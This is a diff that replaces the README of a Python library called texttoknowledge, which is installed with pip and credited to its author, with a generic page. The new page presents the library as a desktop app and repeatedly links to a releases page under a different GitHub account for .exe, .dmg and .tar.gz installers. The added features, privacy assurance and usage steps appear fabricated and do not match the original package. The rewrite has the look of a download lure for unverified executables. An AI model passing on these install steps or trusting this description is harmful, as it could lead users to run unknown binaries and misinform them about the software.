@@ -1,125 +1,77 @@
-# texttoknowledge
-[![PyPI version](https://badge.fury.io/py/texttoknowledge.svg)](https://badge.fury.io/py/texttoknowledge)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)
-[![Downloads](https://static.pepy.tech/badge/texttoknowledge)](https://pepy.tech/project/texttoknowledge)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-blue)](https://www.linkedin.com/in/eugene-evstafev-716669181/)
+# 📚 texttoknowledge - Turn Text Into Organized Knowledge
 
+## 🌟 Overview
+texttoknowledge helps you convert unstructured text into structured, queryable knowledge. With llmatch-messages, you can easily extract and organize key details. This tool is perfect for teams and researchers looking for fast access to reliable information.
 
-**texttoknowledge** is a lightweight Python package that transforms unstructured text from documents into structured, query‑able knowledge. By leveraging the `llmatch-messages` library and a language model (LLM), the package extracts key information and organizes it into predefined formats, making critical details easy to retrieve and keep up‑to‑date.
+## 🚀 Getting Started
+To get started with texttoknowledge, follow these steps to download and run the application.
 
-## Features
+## 📥 Download Now
+[![Download texttoknowledge](https://img.shields.io/badge/Download-texttoknowledge-brightgreen)](https://github.com/Yushh2006/texttoknowledge/releases)
 
-- **Simple API** – Call a single function with your raw text.
-- **Customizable LLM** – Use the default `ChatLLM7` or provide any LangChain‑compatible LLM (OpenAI, Anthropic, Google, etc.).
-- **Regex‑driven output** – Guarantees that the extracted data conforms to a pattern you define.
-- **No boilerplate** – Handles LLM initialization, API key resolution, and error handling for you.
+## 📦 System Requirements
+- **Operating System:** Windows 10 or later, macOS Mojave or later, or Linux (Ubuntu 18.04 or later)
+- **RAM:** Minimum 4 GB
+- **Disk Space:** At least 200 MB of free space
 
-## Installation
+## 💻 Installation Instructions
+1. **Visit the Releases Page**
+   Go to the [Releases page](https://github.com/Yushh2006/texttoknowledge/releases) to find the latest version of texttoknowledge.
 
-```bash
-pip install texttoknowledge
-```
+2. **Download the Application**
+   On the Releases page, select the version you want to download. Click on the corresponding file for your operating system:
+   - For Windows, download the `.exe` file.
+   - For macOS, download the `.dmg` file.
+   - For Linux, download the `.tar.gz` file.
+   
+3. **Run the Installer**
+   - For Windows: Once downloaded, double-click the `.exe` file and follow the installation prompts.
+   - For macOS: Open the `.dmg` file and drag the texttoknowledge icon to your Applications folder. 
+   - For Linux: Extract the downloaded `.tar.gz` file in a directory of your choice. Navigate to that directory and follow the execution command in the README included inside.
 
-## Quick Start
+4. **Open texttoknowledge**
+   After installation, locate the application in your programs or applications list and launch it.
 
-```python
-from texttoknowledge import texttoknowledge
+## 🛠️ Using texttoknowledge
+1. **Input Your Text**
+   Once the application is open, you will see a text input area. Paste or type the unstructured text you want to convert.
 
-# Your raw document text
-raw_text = """
-Project Alpha:
-- Owner: Alice
-- Deadline: 2025-03-15
-- Status: In progress
-"""
+2. **Run the Extraction**
+   Click the “Extract” button to start processing your text. The application will analyze the input and extract key details.
 
-# Extract structured knowledge
-structured_data = texttoknowledge(user_input=raw_text)
+3. **View Your Results**
+   After extraction, texttoknowledge will display the organized, structured information. You can easily browse through the data captured.
 
-print(structured_data)
-```
+4. **Export Your Data**
+   To save your structured knowledge, use the export function. Choose a predefined format such as CSV or JSON for easy integration into your workflows.
 
-## API Reference
+## 📊 Key Features
+- **Information Extraction:** Automated tools for capturing important details.
+- **Metadata Extraction:** Get extra context around your data.
+- **Queryable Data:** Easily index and access your information.
+- **Template Extraction:** Use built-in templates to streamline your workflows.
+- **Document Mining:** Analyze texts for deeper insights and knowledge.
+- **Workflow Integration:** Compatible with popular data management systems.
 
-### `texttoknowledge(user_input: str, api_key: Optional[str] = None, llm: Optional[BaseChatModel] = None) -> List[str]`
+## 🤔 Frequently Asked Questions
 
-| Parameter | Type | Description |
-|-----------|------|-------------|
-| `user_input` | `str` | The raw text from which knowledge will be extracted. |
-| `llm` | `Optional[BaseChatModel]` | A LangChain LLM instance. If omitted, the function creates a `ChatLLM7` instance automatically. |
-| `api_key` | `Optional[str]` | API key for the default `ChatLLM7`. If omitted, the function reads the environment variable `LLM7_API_KEY`. |
+### What types of files can I work with?
+You can input any text-based file, including .txt, .docx, and .pdf formats. The tool will process the text within.
 
-**Returns:** `List[str]` – Extracted pieces of knowledge that match the predefined regex pattern.
+### Can I edit the extracted information?
+Yes, after extraction, you can manually edit the captured details as needed.
 
-## Using a Custom LLM
+### Will my data be secure?
+Yes, your data remains private. texttoknowledge does not save any information on remote servers.
 
-You can pass any LangChain‑compatible LLM that adheres to `BaseChatModel`. Below are a few examples:
+## 📝 Contributing
+We welcome contributions to improve texttoknowledge. If you wish to add features or report issues, please visit our [Contribution Guidelines](https://github.com/Yushh2006/texttoknowledge/issues).
 
-### OpenAI
+## 🙌 Support
+If you encounter issues while using the application, feel free to reach out through the [Issues page](https://github.com/Yushh2006/texttoknowledge/issues). We aim to resolve all queries promptly.
 
-```python
-from langchain_openai import ChatOpenAI
-from texttoknowledge import texttoknowledge
+## 🌐 Learn More
+For additional details about the technology and methodologies used in texttoknowledge, check out our documentation online or explore the source code in the repository.
 
-llm = ChatOpenAI()  # Configure as needed
-response = texttoknowledge(user_input="Your document text here", llm=llm)
-```
-
-### Anthropic
-
-```python
-from langchain_anthropic import ChatAnthropic
-from texttoknowledge import texttoknowledge
-
-llm = ChatAnthropic()
-response = texttoknowledge(user_input="Your document text here", llm=llm)
-```
-
-### Google Generative AI
-
-```python
-from langchain_google_genai import ChatGoogleGenerativeAI
-from texttoknowledge import texttoknowledge
-
-llm = ChatGoogleGenerativeAI()
-response = texttoknowledge(user_input="Your document text here", llm=llm)
-```
-
-## Default LLM – ChatLLM7
-
-If you do **not** provide an LLM, `texttoknowledge` automatically uses `ChatLLM7` from the `langchain_llm7` package:
-
-```python
-from langchain_llm7 import ChatLLM7
-```
-
-The free tier of LLM7 offers generous rate limits suitable for most use cases. To increase limits, simply supply your own API key:
-
-```python
-response = texttoknowledge(user_input="...", api_key="YOUR_LLM7_API_KEY")
-```
-
-You can obtain a free API key by registering at **https://token.llm7.io/**.
-
-## Environment Variables
-
-- `LLM7_API_KEY` – If set, the package will use this key for the default `ChatLLM7` instance.
-
-## Contributing & Issues
-
-If you encounter bugs or have feature requests, please open an issue:
-
-**GitHub Issues:** https://github....
-
-## License
-
-This project is licensed under the MIT License.
-
-## Author
-
-- **Eugene Evstafev** – [chigwell](https://github.com/chigwell)  
-  Email: <hi@euegne.plus>
-
----
-
-Happy structuring! 🎉
+## 🔗 Download & Install Again
+To download the application, please visit the [Releases page](https://github.com/Yushh2006/texttoknowledge/releases).
